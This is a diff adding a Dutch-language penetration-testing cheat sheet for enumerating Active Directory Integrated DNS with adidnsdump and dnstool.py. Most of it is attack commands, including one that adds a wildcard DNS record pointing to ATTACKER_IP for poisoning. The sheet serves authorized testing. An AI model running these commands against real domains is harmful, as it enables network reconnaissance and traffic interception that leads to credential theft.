@@ -1,0 +1,33 @@
+# ADIDNS Enumeratie — Active Directory Integrated DNS records opvragen
+# Ontdek alle DNS-records beheerd door AD, inclusief verborgen of stale entries
+#
+# === Vereisten ===
+# - Domein-authenticatie (elke domain user)
+# - adidnsdump (pip install adidnsdump)
+#
+# === Voorbeelden ===
+
+# Alle ADIDNS records dumpen
+adidnsdump -u DOMAIN\\USER -p 'PASS' DC_IP
+
+# Inclusief verborgen/tombstoned records
+adidnsdump -u DOMAIN\\USER -p 'PASS' --include-tombstoned DC_IP
+
+# Zone transfer poging via LDAP
+adidnsdump -u DOMAIN\\USER -p 'PASS' -r DC_IP
+
+# Met specifieke DNS zone
+adidnsdump -u DOMAIN\\USER -p 'PASS' --zone domain.local DC_IP
+
+# Met Kerberos authenticatie
+adidnsdump -u USER -p 'PASS' -d DOMAIN --use-kerberos DC_IP
+
+# Via dnstool.py - records toevoegen/verwijderen/querien
+python3 dnstool.py -u DOMAIN\\USER -p 'PASS' -r RECORD_NAME -a query DC_IP
+
+# Wildcard record toevoegen (voor poisoning)
+python3 dnstool.py -u DOMAIN\\USER -p 'PASS' -r '*.domain.local' -a add -d ATTACKER_IP DC_IP
+
+# Noot: ADIDNS records staan in CN=MicrosoftDNS,DC=DomainDnsZones,DC=domain,DC=local
+# Noot: Standaard mogen alle Authenticated Users records aanmaken
+# Noot: Stale records kunnen wijzen op subdomain takeover mogelijkheden
